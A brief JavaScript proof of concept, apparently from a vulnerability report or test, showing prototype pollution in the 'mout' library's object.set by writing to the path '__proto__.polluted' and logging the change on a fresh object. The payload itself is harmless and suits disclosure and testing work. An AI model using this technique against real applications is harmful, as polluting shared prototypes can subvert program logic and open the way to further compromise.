var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var mout = require('mout');
var obj = {};
console.log({}.polluted);
mout.object.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);